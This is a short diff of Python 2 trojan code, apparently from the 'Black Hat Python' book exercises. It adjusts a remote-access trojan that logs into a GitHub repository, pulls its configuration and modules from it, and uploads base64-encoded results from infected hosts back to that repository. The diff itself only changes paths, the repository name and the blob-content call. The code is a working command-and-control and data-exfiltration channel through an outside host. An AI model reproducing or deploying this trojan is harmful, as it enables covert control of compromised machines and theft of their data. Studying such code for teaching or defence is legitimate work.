@@ -17,14 +17,14 @@ from github3 import login
 trojan_id = "abc"
 
 trojan_config = "%s.json" % trojan_id
-data_path = "data/%s/" % trojan_id
+data_path = "trojan/data/%s/" % trojan_id
 trojan_modules = []
 configured = False
 task_queue = Queue.Queue()
 
 def connect_to_github():
-    gh = login(username="example", password="example")
-    repo = gh.repository("username", "black_hat_python")
+    gh = login(username="example", password="password")
+    repo = gh.repository("example", "black-hat-python")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -40,7 +40,7 @@ def get_file_contents(filepath):
         if filepath in filename.path:
             print "[*] Found file %s" % filepath
             blob = repo.blob(filename._json_data['sha'])
-            return blob.get_file_contents
+            return blob.content
 
     return None
 
@@ -60,7 +60,7 @@ def get_trojan_config():
 
 def store_module_result(data):
     gh, repo, branch = connect_to_github()
-    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
+    remote_path = "trojan/data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
 
     return
